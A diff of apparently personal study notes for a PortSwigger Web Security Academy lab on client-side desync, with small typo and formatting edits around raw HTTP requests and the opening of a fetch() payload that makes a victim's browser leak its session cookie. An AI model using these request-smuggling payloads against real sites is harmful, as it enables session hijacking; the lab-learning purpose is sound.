@@ -4647,7 +4647,7 @@ Response: Communication timed out. (chunked size is 5)
 - Client-side desync (Expert)
   - Info: This lab is vulnerable to client-side desync attacks because the server ignores the Content-Length header on requests to some endpoints. You can exploit this to induce a victim's browser to disclose its session cookie.
   - Identify a vulnerable endpoint  > GET / > repeater > change to POST method > disable "udpate content-length" > change the content-length to 1 or higher, but leave the body empty > observer that the server responds immediately and suggested that it is ignoring the specified "content-length"
-  - Identify a client-side desync vector in Burp > 2nd request get 404 not found
+  - Identify a client-side desync vector in Burp > 2nd request get 404 not found  
     Request 1: > Enabled HTTP/1 connection reuse + Enable "update content-length"
     ```
     POST / HTTP/1.1
@@ -4677,8 +4677,8 @@ Response: Communication timed out. (chunked size is 5)
 	    })
 	})
     ```
-  - Identify a gadget that enables you to store text data within the application.
-    Request 1
+  - Identify a gadget that enables you to store text data within the application. > refresh the blog posts
+    Request 1  
     ```
     POST / HTTP/1.1
     Host: YOUR-LAB-ID.h1-web-security-academy.net
@@ -4695,13 +4695,13 @@ Response: Communication timed out. (chunked size is 5)
     csrf=YOUR-CSRF-TOKEN&postId=YOUR-POST-ID&name=wiener&email=wiener@web-security-academy.net&website=https://ginandjuice.shop&comment=
     ```
 
-    Request 2
+    Request 2  
     ```
     GET /capture-me HTTP/1.1
     Host: YOUR-LAB-ID.h1-web-security-academy.net
     ```
   - Combine these to craft an exploit that causes the victim's browser to issue a series of cross-domain requests that leak their session cookie.
-    Exploit server: Bodt > store > deliver to victim (adjsut the content-length)
+    Exploit server: Body > store > deliver to victim (adjsut the content-length)
     ```
     fetch('https://YOUR-LAB-ID.h1-web-security-academy.net', {
         method: 'POST',
